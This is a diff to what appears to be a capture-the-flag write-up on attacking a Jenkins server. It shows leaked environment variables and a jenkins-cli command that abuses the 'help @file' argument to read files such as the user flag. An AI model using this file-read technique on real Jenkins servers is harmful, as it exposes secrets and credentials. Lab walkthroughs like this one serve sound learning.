@@ -93,9 +93,11 @@ You will see the following outcome
 
 ![Alt text](pics/pic9.png)
 
-(pic10)
+First we get a list of commands for the Jenkins server. This is interesting because maybe these variables can help us to exploite the machine more.
 
-The outcome returned is a list of environment variables. At the end, the `help` command cannot interpretate `HOSTNAME=...`. So returns an error. Nonetheless, we obtain several paths and addresses.
+![Alt text](pics/pic10.png)
+
+At the end of the prompt (bottom), the `help` command cannot interpretate `HOSTNAME=...` like it did with the other variables. So returns an error. Nonetheless, we obtain several paths and addresses of interest.
 
 1. HOSTNAME=0f52c222a4cc
 2. JENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimental
@@ -112,7 +114,7 @@ The outcome returned is a list of environment variables. At the end, the `help` 
 13. REF=/usr/share/jenkins/ref
 14. PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
-Observe that we can analyze potential files in these environment variables, for exmaple, HOM, PATH, or JENKINS_HOME. Let' s try to find the user flag `user.txt` on these paths (I will only show the correct location to save time).
+Observe that we can analyze potential files (user.txt, root.txt) in these environment variables (HOME, PATH, or JENKINS_HOME) because that what we are targetting in this machine. Let' s try to find the user flag `user.txt` on these paths.
 
 ```
 java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help "@/var/jenkins_home/user.txt"
